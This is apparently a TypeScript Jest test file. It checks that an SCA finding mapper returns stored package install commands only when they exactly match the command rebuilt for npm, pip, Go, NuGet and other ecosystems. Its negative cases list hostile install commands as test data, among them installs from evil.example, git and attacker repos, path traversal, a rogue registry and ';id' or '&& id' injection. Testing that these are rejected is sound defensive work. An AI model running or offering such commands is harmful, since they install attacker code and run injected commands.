import {
  mapScaDetectionEntityToInterface,
  mapScaDetectionEntityToListInterface,
} from './sca.mapper';
import { ScaVulnerabilityDetections } from 'src/entities/sca-vulnerability-detections.entity';

/**
 * Both readers of the stored fix records (finding detail and finding list)
 * return a stored install command only when it is exactly the command built
 * from the record's own ecosystem, package and version: rows written by
 * earlier versions may hold any text.
 */
function detectionWithCommand(
  installCommand: string | null,
  ecosystem = 'npm',
  recommendedParentPackage = 'express',
  recommendedProposedVersion = '4.18.0',
): ScaVulnerabilityDetections {
  return {
    id: 'det-1',
    projectId: 'proj-1',
    branch: 'main',
    createdAt: new Date('2026-01-01T00:00:00Z'),
    updatedAt: new Date('2026-01-02T00:00:00Z'),
    currentState: 'to_verify',
    currentSeverity: 'high',
    currentPriority: 'normal',
    currentCVSS: 0,
    scoringSource: 'static',
    scaDetectedPackage: undefined,
    vulnerability: undefined,
    historyItems: [],
    scaAutofixRecords: [
      {
        id: 'fix-1',
        status: 'ok',
        cveId: 'CVE-2021-12345',
        ecosystem,
        vulnerablePackage: 'lodash',
        vulnerableVersion: '4.17.19',
        recommendedParentPackage,
        recommendedCurrentVersion: '4.17.1',
        recommendedProposedVersion,
        recommendedUpdateType: 'minor',
        installCommand,
        hasFixAvailable: true,
        createdAt: new Date('2026-01-01T00:00:00Z'),
        updatedAt: new Date('2026-01-01T00:00:00Z'),
      },
    ],
  } as unknown as ScaVulnerabilityDetections;
}

const readers: Array<
  [string, (e: ScaVulnerabilityDetections) => { autofixRecords: unknown[] }]
> = [
  ['detail', (e) => mapScaDetectionEntityToInterface(e)],
  [
    'list',
    (e) =>
      mapScaDetectionEntityToListInterface(e, {
        hasFix: true,
        fixedVersion: '4.18.0',
      }),
  ],
];

const commandOf = (out: { autofixRecords: unknown[] }) =>
  (out.autofixRecords[0] as { installCommand: string }).installCommand;

describe.each(readers)('stored install command, %s reader', (_name, read) => {
  it.each([
    ['npm', 'express', '4.18.0', 'npm install express@4.18.0'],
    ['pypi', 'requests', '2.31.0', 'pip install requests==2.31.0'],
    [
      'maven',
      'org.example:lib',
      '1.2.3',
      '# Update org.example:lib to version 1.2.3 in pom.xml',
    ],
    ['go', 'golang.org/x/net', '0.23.0', 'go get golang.org/x/net@v0.23.0'],
    [
      'nuget',
      'Newtonsoft.Json',
      '13.0.3',
      'dotnet add package Newtonsoft.Json --version 13.0.3',
    ],
    [
      'packagist',
      'symfony/http-foundation',
      '6.4.8',
      'composer require symfony/http-foundation:6.4.8',
    ],
    ['rubygems', 'rails', '7.1.3', 'gem install rails -v 7.1.3'],
    ['crates', 'serde', '1.0.197', 'cargo add serde@1.0.197'],
    [
      'swiftpm',
      'github.com/apple/swift-nio',
      '2.65.0',
      '# Update github.com/apple/swift-nio to version 2.65.0',
    ],
  ])(
    '%s: returns the stored command equal to its rebuilt one',
    (ecosystem, name, version, command) => {
      expect(
        commandOf(
          read(detectionWithCommand(command, ecosystem, name, version)),
        ),
      ).toBe(command);
    },
  );

  it.each([
    ['npm', 'npm install https://evil.example/x.tgz'],
    ['npm', 'npm install x@github:attacker/repo'],
    ['npm', 'npm install attacker/repo'],
    ['npm', 'npm install x@file:../../x'],
    ['npm', 'npm install x@npm:evil@1.0.0'],
    ['pypi', 'pip install https://evil.example/x.whl'],
    ['pypi', 'pip install git+https://evil.example/r'],
    ['npm', 'npm install express;id@4.18.0'],
    ['npm', 'npm install express@4.18.0 && id'],
    ['npm', 'npm install --registry=https://evil.example express'],
  ])(
    '%s: returns no command for %j, the rest of the record intact',
    (ecosystem, command) => {
      const record = read(detectionWithCommand(command, ecosystem))
        .autofixRecords[0];
      expect(record).toMatchObject({
        installCommand: '',
        recommendedParentPackage: 'express',
        recommendedProposedVersion: '4.18.0',
        hasFixAvailable: true,
        status: 'ok',
      });
    },
  );

  it('returns no command that differs from the record package or version', () => {
    expect(
      commandOf(read(detectionWithCommand('npm install lodash@4.18.0'))),
    ).toBe('');
    expect(
      commandOf(read(detectionWithCommand('npm install express@5.0.0'))),
    ).toBe('');
  });

  it('returns no command for a record without one', () => {
    expect(commandOf(read(detectionWithCommand(null)))).toBe('');
  });
});
